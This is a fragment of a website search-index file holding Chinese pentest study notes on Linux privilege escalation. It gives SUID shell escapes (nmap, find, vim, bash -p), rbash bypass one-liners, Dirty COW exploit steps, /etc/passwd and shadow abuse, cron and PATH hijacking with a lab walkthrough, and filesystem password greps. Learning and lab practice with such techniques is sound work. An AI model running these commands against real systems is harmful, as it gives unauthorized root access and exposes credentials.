\u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u80fd\u88absudo"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_3","text":"","title":"\u53ef\u5229\u7528\u4e8e\u63d0\u6743\u7684\u547d\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#1nmap","text":"nmap --interactive \u4f7f\u7528nmap\u7684udp\u6216tcp syn\u626b\u63cf\u65f6\uff0c\u9700\u8981\u7528\u5230root\u6743\u9650\uff0c\u6240\u4ee5\u6709\u4e9b\u7ba1\u7406\u5458\u56fe\u65b9\u4fbf\u4f1a\u76f4\u63a5\u7ed9namp\u4e0as\u6743\u9650\uff0c\u800cnmap 5.20(\u4f7f\u7528nmap -v\u67e5\u770bnmap\u7248\u672c)\u4e4b\u524d\u6709\u4e00\u4e2ainteractive\u4ea4\u4e92\u6a21\u5f0f(nmap \u2013interactive)\uff0c\u5728nmap effective uid\u4e3a0\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6a21\u5f0f\u83b7\u5f97root\u6743\u9650\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\uff0c\u6210\u529f\u63d0\u6743 echo \"os.execute('/bin/bash')\" > ./shell nmap --script=shell \u5168\u7248\u672c\u901a\u6740\u63d0\u6743\uff0c\u5229\u7528nmap\u53ef\u4ee5\u6267\u884c\u6307\u5b9a\u6587\u4ef6\u7684\u7279\u70b9\u63d0\u6743","title":"1.nmap"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#2find","text":"find / -exec command find\u547d\u4ee4\u81ea\u5e26-exec\u53c2\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff0c\u82e5find\u6709suid\u6743\u9650\uff0c\u90a3\u4e48\u4f7f\u7528exec\u76f8\u5f53\u4e8e\u76f4\u63a5\u63d0\u6743\u5230root. \u8bfb\u6587\u4ef6 find /path -exec {} \\;","title":"2.find"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#3vim","text":"vim\u6709\u4e86suid\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u4e86 \u540c\u65f6\u4e5f\u53ef\u4ee5\u8f93\u5165 :shell \u6765\u83b7\u53d6root shell","title":"3.vim"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#4bash","text":"bash -p \u5f00\u542f\u4e00\u4e2a\u65b0shell\uff0csuid\u7684\u8bdd\u81ea\u7136\u662f\u5f00\u542froot shell","title":"4.bash"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#5lessmore","text":"\u548cvim\u5dee\u4e0d\u591a\uff0c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8f93\u5165 !command \u8fdb\u884c\u63d0\u6743\u5230root","title":"5.less\uff0cmore"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#6exim","text":"exim\u5728\u7279\u5b9a\u7248\u672c\u4e0b\u4f1a\u6709suid\u63d0\u6743 \u4e0b\u8f7dexp\u6253\u5c31\u5b8c\u4e8b\u4e86","title":"6.exim"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#rbash","text":"","title":"rbash \u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#rbash_1","text":"rbash\uff0c\u662f\u51fa\u4e8e\u5b89\u5168\u6027\u8003\u8651\u7684\u4e00\u4e2a\u529f\u80fd\u53d7\u9650\u7684bash\uff0c\u6211\u5728vulnhub dc-2\u9996\u6b21\u63a5\u89e6,\u4ed6\u7684\u9650\u5236\u6027\u53ef\u80fd\u4f1a\u6709\u5982\u4e0b. cd \u5207\u6362\u76ee\u5f55 \u542b\u6709\u659c\u6760 / \u7684\u547d\u4ee4, \u8b6c\u5982 /bin/sh \u8bbe\u7f6e PATH ENV \u7b49\u73af\u5883\u53d8\u91cf \u4f7f\u7528 > < \u8fdb\u884c\u91cd\u5b9a\u5411 binary \u7684\u8fd0\u884c. \u901a\u5e38 root \u7528\u6237\u4f1a\u624b\u52a8\u521b\u5efa /bin/binary_file -> /home/rbash_user/bin/binary_file \u7684\u8f6f\u94fe\u63a5, \u9650\u5236\u6027\u5730\u63d0\u4f9b\u90e8\u5206 binary_file \u7ed9 rbash_user \u4f7f\u7528 \u5728 bash \u4e0b echo $SHELL , \u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u73af\u5883\u662f\u5426\u662f rbash.","title":"\u4f55\u4e3arbash"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#bypass","text":"","title":"bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#scp-bypass","text":"\u6211\u5728 http://www.const27.com/2020/07/02/vulnhub-dc-2/\u5c31\u662f\u7528scp\u7ed5\u7684","title":"scp bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#shell-bypass","text":"man,git config help,more,less,vim,vi,ftp,gdb\u7b49\u547d\u4ee4\u90fd\u6709\u81ea\u5df1\u7684shell\uff0c\u6211\u4eec\u53ea\u9700\u5728\u4ed6\u4eec\u5404\u81ea\u7684shell\u4e2d\u6267\u884c/bin/sh\u5373\u53ef \u4e00\u822c\u90fd\u662f\u5728shell\u952e\u5165!/bin/sh\u6765bypass rbash \u4e0b\u9762\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u662f\u53ef\u884c\u7684\uff08\u4f3c\u4e4e\u4ec5vim) :set shell=/bin/bash :shell \u6267\u884c\u4e0a\u9762\u4e24\u4e2a\u8bed\u53e5\uff0c\u5c31bypass\u4e86","title":"\u8fdb\u5165\u547d\u4ee4\u81ea\u5e26shell bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#find-bypasss","text":"\u7b80\u5355\u6982\u62ec\u5c31\u662f-exec\u6267\u884c\u4e00\u4e0b/bin/bash \u2026","title":"find bypasss"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#bypass_1","text":"python \u5982\u679cpython\u90fd\u53ef\u4ee5\u7528\u7684\u8bdd\uff0c\u90a3\u5c31\u66f4\u8f7b\u677e\u4e86\uff0cos\u5b89\u6392\u4e00\u4e0b \u4f3c\u4e4epty\u4e5f\u884c?\u6ca1\u8bd5 python -c \"import os;os.system('/bin/bash')\" php php -a \u8fdb\u5165php shell \u7136\u540e\u6267\u884c\u547d\u4ee4:exec(\"/bin/bash\"); perl perl -e 'exec \"/bin/sh\";' ruby ruby -e 'exec \"/bin/bash\"'","title":"\u7f16\u7a0b\u8bed\u8a00 bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#cp-bypass","text":"\u76f4\u63a5\u7528cp\u628a/usr/bin\u91cc\u7684\u547d\u4ee4\u590d\u5236\u8fc7\u6765\u5c31\u884c\u4e86","title":"cp bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#pathshell","text":"\u952e\u5165export -p \u67e5\u770b\u8be5\u7528\u6237\u7684\u53d8\u91cf \u5982\u679c\u8fd9\u4fe9\u53d8\u91cf\u6709w\u6743\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5199\u5165\u6765bypass","title":"\u76f4\u63a5\u66f4\u6539PATH/SHELL\u53d8\u91cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#ssh-bypass","text":"\u539f\u7406\u662f\u901a\u8fc7ssh\u94fe\u63a5\u5f53\u524dIP\u7684\u5f53\u524d\u7528\u6237\u5e76\u542f\u52a8/bin/bash ssh username@Ip -t \"/bin/bash\"","title":"ssh bypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_4","text":"\u7528 uanme -a \u67e5\u660e\u5185\u6838\u7248\u672c uname\u6bd4\u8f83\u770b\u4e0d\u61c2\uff0c\u53ef\u4ee5\u7528lsb_release -a \u7136\u540e\u627eexp\u6253\u5c31\u5b8c\u4e8b\u4e86\uff0c\u5185\u6838\u63d0\u6743\u7684\u5185\u5bb9\u6709\u70b9\u5e95\u5c42\uff0c\u6682\u65f6\u4e0d\u7528\u6df1\u5165\u4e86\u89e3","title":"\u5185\u6838\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_5","text":"\u67e5\u770b\u5185\u6838\u7248\u672c:uname -r 2.6.22<kernel version<4.8.3\u30014.7.9\u548c4.4.26 exp https://github.com/firefart/dirtycow.git Compile with: gcc -pthread dirty.c -o dirty -lcrypt Then run the newly create binary by either doing: ./dirty or ./dirty my-new-password Afterwards, you can either su firefart or ssh firefart@... DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT! mv /tmp/passwd.bak /etc/passwd Exploit adopted by Christian \"FireFart\" Mehlmauer","title":"\u810f\u725b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#cve-cve-2023-cve-2023-35001","text":"v3.13-rc1 <= Linux Kernel < v6.5-rc2 \u7b49exp","title":"cve-cve-2023-cve-2023-35001"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#passwdshadow","text":"","title":"passwd\u548cshadow"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_6","text":"/etc/passwd \u9ed8\u8ba4\u6240\u6709\u7528\u6237\u53ef\u8bfb\uff0c\u4f46\u53ea\u6709root\u53ef\u5199\u3002 /etc/passwd\u91cc\u7684\u7528\u6237\u53e3\u4ee4\u5f80\u5f80\u4ee5x\u4ee3\u66ff\uff0c\u5176\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u4f1a\u5b58\u5165/etc/shadow\u91cc\u9762\uff0c/etc/shadow\u9ed8\u8ba4\u53ea\u6709root\u53ef\u8bfb\u3002 \u4f46\u662f\u6709\u5c0f\u6982\u7387\u60c5\u51b5\uff0c\u660e\u6587\u5bc6\u7801\u5c31\u76f4\u63a5\u51fa\u73b0\u5728/etc/passwd\u4e86\uff0c\u5982\u679c\u6709\u8fd9\u4e2a\u60c5\u51b5\u4e14root\u5bc6\u7801\u66b4\u9732\u5728\u4e86passwd\u91cc\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u63d0\u6743\u4e86","title":"\u660e\u6587\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#passwd","text":"\u5982\u679c/etc/passwd \u6211\u4eec\u5f53\u524d\u7528\u6237\u53ef\u5199\uff0c\u53ef\u4ee5\u76f4\u63a5\u628aroot\u7684\u5bc6\u7801\u6539\u6210\u4e00\u4e2a\u660e\u6587\u5bc6\u7801\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u6743\u76ee\u7684","title":"passwd \u53ef\u5199"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#shadow","text":"\u5982\u679c/etc/shadow \u53ef\u8bfb\uff0c\u6211\u4eec\u53ef\u4ee5\u7528hashcat\u6216\u8005john\u66b4\u529b\u7834\u89e3shadow\u6587\u4ef6","title":"\u7206\u7834shadow"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_7","text":"","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_8","text":"\u8ba1\u5212\u4efb\u52a1\u7531crontab\u7ba1\u7406\uff0c\u975eroot\u7528\u6237\u662f\u65e0\u6cd5\u5217\u51faroot\u7528\u6237\u7684\u8ba1\u5212\u4efb\u52a1\u7684\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5217\u51fa/etc\u7684\u7cfb\u7edf\u4efb\u52a1\uff0c\u7cfb\u7edf\u4efb\u52a1\u9ed8\u8ba4\u662froot\u6743\u9650\u8fd0\u884c\u7684 ls -l /etc/cron* \u5982\u679c\u6211\u4eec\u6709\u5e78\u6709\u6743\u9650\u80fd\u66f4\u6539\u5176\u4e2d\u4e00\u4e2a\u4efb\u52a1\u6307\u5b9a\u7684\u811a\u672c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f80\u811a\u672c\u91cc\u6dfb\u52a0\u5982\u53cd\u5f39shell\u7b49\u6307\u4ee4\uff0c\u4ece\u800c\u63d0\u6743","title":"\u6587\u4ef6\u91cd\u5199"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_9","text":"\u6211\u4eec\u67e5\u770b\u5b9a\u65f6\u4efb\u52a1 \u53d1\u73b0\u5b9a\u4e49\u4e86\u8bf8\u591a\u73af\u5883\u53d8\u91cf\uff0c\u5982\u679c\u5176\u4efb\u52a1\u6709\u672a\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\u7684\u6307\u4ee4\uff0c\u5982 17 * * * * root shell.sh \u800c\u4e14\u6211\u4eec\u5728\u5176\u73af\u5883\u53d8\u91cf\u8def\u5f84\u4e2d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5199\u5165\u73af\u5883\u53d8\u91cf\u7684\u9760\u524d\u8def\u5f84\u4e00\u4e2a\u540c\u540d\u6076\u610f\u6587\u4ef6\u4ece\u800c\u5bfc\u81f4\u73af\u5883\u53d8\u91cf\u52ab\u6301 \u6bd4\u5982\u6211\u4eec\u5728/sbin \u5199\u5165\u4e00\u4e2a \u53cd\u5f39shell\u529f\u80fd\u7684shell.sh\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u9020\u6210\u63d0\u6743","title":"\u73af\u5883\u53d8\u91cf\u52ab\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_10","text":"https://www.secpulse.com/archives/72965.html \u603b\u7ed3\u7684\u592a\u597d\u4e86\uff0c\u6211\u90fd\u4e0d\u60f3\u8bb0\u7b14\u8bb0\u4e86\uff08\u5077\u61d2","title":"\u901a\u914d\u7b26\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_11","text":"\u5982\u679c\u6211\u4eec\u627e\u5230\u4e00\u4e2asuid\u6743\u9650\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u5b8c\u6210suid\u63d0\u6743\uff0c\u5c31\u53ef\u4ee5\u8bd5\u8bd5\u642d\u914d\u73af\u5883\u53d8\u91cf\u8fdb\u884c\u63d0\u6743\u3002 \u8fd9\u4e2a\u63d0\u6743\u65b9\u6cd5\u7684\u601d\u60f3\u662f\uff0c\u627e\u5230\u6709suid\u7684\uff0c\u5185\u90e8\u6709system\u51fd\u6570\u8c03\u7528\u672a\u6307\u5b9a\u8def\u5f84\u7684\u547d\u4ee4\u7684\u6587\u4ef6\u3002\u540c\u65f6\u7528\u6237\u6709\u4fee\u6539\u81ea\u5df1\u73af\u5883\u53d8\u91cf\u7684\u6743\u9650\uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301system\u51fd\u6570\u91cc\u8c03\u7528\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4f7f\u5176\u6307\u5411\u6211\u4eec\u73af\u5883\u53d8\u91cf\u91cc\u81ea\u884c\u521b\u5efa\u7684\u4e00\u4e2a\u540c\u540d\u811a\u672c\u6587\u4ef6\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6211\u4eec\u81ea\u884c\u521b\u5efa\u7684\u540c\u540d\u811a\u672c\u6587\u4ef6\u5c31\u80fd\u4ee5root\u6743\u9650\u8fd0\u884c\u4e86\uff0c\u5982\u679c\u8fd9\u4e2a\u811a\u672c\u6587\u4ef6\u91cc\u7684\u547d\u4ee4\u662f/bin/bash\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u6211\u4eec\u63d0\u6743\u4e86\u3002 \u53ef\u80fd\u6709\u70b9\u5c0f\u7ed5\uff0c\u770b\u4e0b\u9762\u5177\u4f53\u64cd\u4f5c\u5c31\u884c\u4e86\u3002 \u5b9e\u9a8c\u5ba4\u914d\u7f6e: \u9996\u5148\u5728\u4e00\u4e2a\u76ee\u5f55\u4e0b\u521b\u5efa\u5982\u4e0b\u6587\u4ef6 vim demo.c \u7136\u540e gcc demo.c -o shell \u5c06\u5176\u7f16\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6 \u7136\u540e chmod u+s shell \u4e3a\u5176\u589e\u52a0suid\u6743\u9650 \u653b\u51fb\u8005\u89c6\u89d2: \u9996\u5148\u4f7f\u7528\u4e0b\u5217\u6307\u4ee4\u641c\u5bfbsuid\u6743\u9650\u6587\u4ef6 find / -perm -u=s -type f 2>/dev/null \u53d1\u73b0\u53ef\u7591\u76ee\u6807\uff0c\u6267\u884c\u4e00\u4e0b\u770b\u770b \u53d1\u73b0\u8fd4\u56de\u4e86ps\u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u731c\u6d4b\u8fd9\u4e2a\u6587\u4ef6\u5185\u90e8 \u6709 system(\"ps\"); \u8fd9\u6761c\u8bed\u8a00\u4ee3\u7801\u3002 \u9042\u53ef\u5c1d\u8bd5\u73af\u5883\u53d8\u91cf\u63d0\u6743 \u6211\u4eec\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 cd /tmp echo \"/bin/bash\" > ps export $PATH=/tmp:$PATH \u9700\u8981\u4fee\u6539\u81ea\u8eab\u73af\u5883\u53d8\u91cf\u7684\u6743\u9650\uff0c\u4f46\u57fa\u672c\u4e0a\u90fd\u6709\u8fd9\u4e2a\u6743\u9650 chmod 777 ./ps \u6ca1\u8fd9\u6761\u547d\u4ee4\u4f1a\u5bfc\u81f4\u63d0\u6743\u5931\u8d25 cd /home/const27 ./shell \u63d0\u6743\u6210\u529f","title":"\u73af\u5883\u53d8\u91cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_12","text":"\u8fd9\u4e2a\u63d0\u6743\u6280\u672f\u8bf4\u767d\u4e86\uff0c\u5c31\u662f\u53bb\u5230\u5904\u7ffb\u5bc6\u7801","title":"\u5bc6\u7801\u67e5\u627e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_13","text":"grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; 